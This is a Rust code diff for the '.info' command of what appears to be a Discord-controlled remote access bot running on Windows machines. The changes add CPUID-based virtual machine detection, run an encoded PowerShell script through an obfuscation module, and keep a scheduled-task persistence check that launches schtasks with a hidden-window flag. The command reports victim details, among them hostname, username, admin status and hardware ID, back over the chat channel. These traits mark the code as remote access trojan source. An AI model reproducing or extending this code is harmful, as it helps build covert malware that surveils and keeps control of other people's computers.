@@ -1,3 +1,4 @@
+use crate::commands::core::cpuid::CpuId;
 use crate::commands::*;
 use crate::system_info::DeviceInfo;
 use anyhow::Result;
@@ -8,17 +9,30 @@ use twilight_http::Client as HttpClient;
 use twilight_model::channel::message::embed::EmbedFooter;
 use twilight_model::channel::message::Message;
 use twilight_util::builder::embed::EmbedBuilder;
+use crate::utils::ps_encoder::{ run_encoded_string, scripts };
 
 pub struct InfoCommand;
 
 #[async_trait]
 impl BotCommand for InfoCommand {
-    fn name(&self) -> &str { "info" }
-    fn description(&self) -> &str { "Display information about the bot system" }
-    fn category(&self) -> &str { "core" }
-    fn usage(&self) -> &str { ".info" }
-    fn examples(&self) -> &'static [&'static str] { &[".info"] }
-    fn aliases(&self) -> &'static [&'static str] { &["about", "botinfo"] }
+    fn name(&self) -> &str {
+        "info"
+    }
+    fn description(&self) -> &str {
+        "Display information about the bot system"
+    }
+    fn category(&self) -> &str {
+        "core"
+    }
+    fn usage(&self) -> &str {
+        ".info"
+    }
+    fn examples(&self) -> &'static [&'static str] {
+        &[".info"]
+    }
+    fn aliases(&self) -> &'static [&'static str] {
+        &["about", "botinfo"]
+    }
 
     async fn execute(&self, http: &Arc<HttpClient>, msg: &Message, _args: Arguments) -> Result<()> {
         let mut sys = System::new_all();
@@ -36,9 +50,14 @@ impl BotCommand for InfoCommand {
             current_directory: "Unknown".to_string(),
         });
 
-        let gpu_info = InfoCommand::get_gpu_info();
-        
-        // Check startup persistence
+        let cpu_info = CpuId::get();
+        let cpu_name = &cpu_info.brand;
+        let cpu_cores = cpu_info.cores;
+        let cpu_threads = cpu_info.threads;
+        let cpu_features = cpu_info.features.to_string_list().join(", ");
+        let is_vm = cpu_info.features.hypervisor;
+
+        let gpu_info = run_encoded_string(&scripts::get_gpu_info())?; // let gpu_info = InfoCommand::get_gpu_info();
         let startup_status = InfoCommand::check_startup_status();
 
         let system_uptime = sys.uptime();
@@ -50,17 +69,18 @@ impl BotCommand for InfoCommand {
         let available_memory_gb = sys.available_memory() as f64 / (1024.0 * 1024.0 * 1024.0);
         let memory_usage_percent = (used_memory_gb / total_memory_gb) * 100.0;
 
-        let cpu_count = sys.cpus().len();
-        let cpu_name = InfoCommand::get_cpu_name();
+        // ใช้ sysinfo สำหรับ CPU usage (CPUID ไม่มี)
         let avg_cpu_usage = if !sys.cpus().is_empty() {
-            sys.cpus().iter().map(|cpu| cpu.cpu_usage()).sum::<f32>() / cpu_count as f32
+            sys.cpus().iter().map(|cpu| cpu.cpu_usage()).sum::<f32>() / sys.cpus().len() as f32
         } else {
             0.0
         };
 
         let mut disk_info = String::new();
         for (i, disk) in sys.disks().iter().enumerate() {
-            if i >= 3 { break; }
+            if i >= 3 {
+                break;
+            }
             let total_gb = disk.total_space() as f64 / (1024.0 * 1024.0 * 1024.0);
             let available_gb = disk.available_space() as f64 / (1024.0 * 1024.0 * 1024.0);
             let used_gb = total_gb - available_gb;
@@ -80,17 +100,21 @@ impl BotCommand for InfoCommand {
 
         let process_count = sys.processes().len();
 
+        // VM indicator
+        let vm_status = if is_vm { " [VM]" } else { "" };
+
         let embed = EmbedBuilder::new()
             .description(format!(
                 "**System Information**\n\n\
                 **System**\n\
-                • Host: {}\n\
+                • Host: {}{}\n\
                 • OS: {}\n\
                 • User: {} ({})\n\
                 • Directory: {}\n\n\
                 **CPU**\n\
                 • Model: {}\n\
-                • Cores: {}\n\
+                • Cores: {} / Threads: {}\n\
+                • Features: {}\n\
                 • Usage: {:.1}%\n\
                 • Uptime: {}h {}m\n\n\
                 **Memory**\n\
@@ -106,6 +130,7 @@ impl BotCommand for InfoCommand {
                 • Admin: {}\n\
                 • Startup: {}",
                 device_info.hostname,
+                vm_status,
                 device_info.os_version,
                 device_info.username,
                 if device_info.admin_status {
@@ -125,7 +150,13 @@ impl BotCommand for InfoCommand {
                     },
                 cpu_name.chars().take(50).collect::<String>()
                     + if cpu_name.len() > 50 { "..." } else { "" },
-                cpu_count,
+                cpu_cores,
+                cpu_threads,
+                if cpu_features.is_empty() {
+                    "N/A".to_string()
+                } else {
+                    cpu_features
+                },
                 avg_cpu_usage,
                 uptime_hours,
                 uptime_minutes,
@@ -145,8 +176,9 @@ impl BotCommand for InfoCommand {
             ))
             .footer(EmbedFooter {
                 text: format!(
-                    "v0.2.5 • HWID: {}",
-                    device_info.hardware_id.chars().take(8).collect::<String>()
+                    "v0.3.0 • HWID: {} • {}",
+                    device_info.hardware_id.chars().take(8).collect::<String>(),
+                    cpu_info.vendor
                 ),
                 icon_url: None,
                 proxy_icon_url: None,
@@ -164,25 +196,24 @@ impl InfoCommand {
         use crate::config::Config;
         use crate::utils::obfuscate::exe;
         use std::os::windows::process::CommandExt;
-        
+
         let startup_config = Config::get_startup_config();
-        
+
         if !startup_config.enabled {
             return "Disabled".to_string();
         }
-        
+
         let task_name = startup_config.task_name;
-        
-        // try w /fo LIST format for better parsing
+
         match Command::new(exe::schtasks())
-            .args(["/query", "/tn", task_name, "/fo", "LIST"])
+            .args(["/query", "/tn", &task_name, "/fo", "LIST"])
             .creation_flags(0x08000000)
             .output()
         {
             Ok(output) => {
                 if output.status.success() {
                     let stdout = String::from_utf8_lossy(&output.stdout);
-                    if stdout.contains(task_name) {
+                    if stdout.contains(&task_name) {
                         "Active".to_string()
                     } else {
                         "Not Found".to_string()
@@ -196,77 +227,8 @@ impl InfoCommand {
                     }
                 }
             }
-            Err(e) => format!("Check Failed: {}", e)
+            Err(e) => format!("Check Failed: {}", e),
         }
-    }
-
-    fn get_cpu_name() -> String {
-        if cfg!(target_os = "windows") {
-            if let Ok(output) = Command::new("wmic")
-                .args(["cpu", "get", "name", "/format:list"])
-                .output()
-            {
-                if output.status.success() {
-                    let result = String::from_utf8_lossy(&output.stdout);
-                    for line in result.lines() {
-                        if line.starts_with("Name=") && !line.ends_with("=") {
-                            let cpu_name =
-                                line.strip_prefix("Name=").unwrap_or("").trim().to_string();
-                            if !cpu_name.is_empty() {
-                                return cpu_name;
-                            }
-                        }
-                    }
-                }
-            }
-
-            if let Ok(output) = {
-                use crate::utils::obfuscate::{exe, powershell as ps};
-                Command::new(exe::powershell())
-                    .args([&ps::command(), "Get-WmiObject -Class Win32_Processor | Select-Object Name | Format-List"])
-                    .output()
-            } {
-                if output.status.success() {
-                    let result = String::from_utf8_lossy(&output.stdout);
-                    for line in result.lines() {
-                        if line.trim().starts_with("Name") && line.contains(':') {
-                            if let Some(name) = line.split(':').nth(1) {
-                                let cpu_name = name.trim().to_string();
-                                if !cpu_name.is_empty() {
-                                    return cpu_name;
-                                }
-                            }
-                        }
-                    }
-                }
-            }
-
-            if let Ok(output) = Command::new("reg")
-                .args([
-                    "query",
-                    "HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0",
-                    "/v",
-                    "ProcessorNameString",
-                ])
-                .output()
-            {
-                if output.status.success() {
-                    let result = String::from_utf8_lossy(&output.stdout);
-                    for line in result.lines() {
-                        if line.contains("ProcessorNameString") && line.contains("REG_SZ") {
-                            if let Some(parts) = line.split("REG_SZ").nth(1) {
-                                let cpu_name = parts.trim().to_string();
-                                if !cpu_name.is_empty() {
-                                    return cpu_name;
-                                }
-                            }
-                        }
-                    }
-                }
-            }
-        }
-
-        "Unknown CPU".to_string()
     }
 
     fn get_gpu_info() -> String {
@@ -343,6 +305,7 @@ impl InfoCommand {
                 );
             }
 
+            // Fallback to PowerShell if wmic fails
             if let Ok(output) = {
                 use crate::utils::obfuscate::{exe, powershell as ps};
                 Command::new(exe::powershell())
@@ -357,18 +320,22 @@ impl InfoCommand {
                         if line.trim().starts_with("Name") && line.contains(':') {
                             if let Some(name) = line.split(':').nth(1) {
                                 let gpu_name = name.trim().to_string();
-                                if !gpu_name.is_empty() &&
-                                   !gpu_name.to_lowercase().contains("microsoft") &&
-                                   !gpu_name.to_lowercase().contains("remote") {
-                                    gpu_names.push(gpu_name.chars().take(35).collect::<String>() +
-                                        if gpu_name.len() > 35 { "..." } else { "" });
+                                if !gpu_name.is_empty()
+                                    && !gpu_name.to_lowercase().contains("microsoft")
+                                    && !gpu_name.to_lowercase().contains("remote")
+                                {
+                                    gpu_names.push(
+                                        gpu_name.chars().take(35).collect::<String>()
+                                            + if gpu_name.len() > 35 { "..." } else { "" },
+                                    );
                                 }
                             }
                         }
                     }
 
                     if !gpu_names.is_empty() {
-                        return format!("**GPU{}:** {}",
+                        return format!(
+                            "**GPU{}:** {}",
                             if gpu_names.len() > 1 { "s" } else { "" },
                             gpu_names.join("\n")
                         );
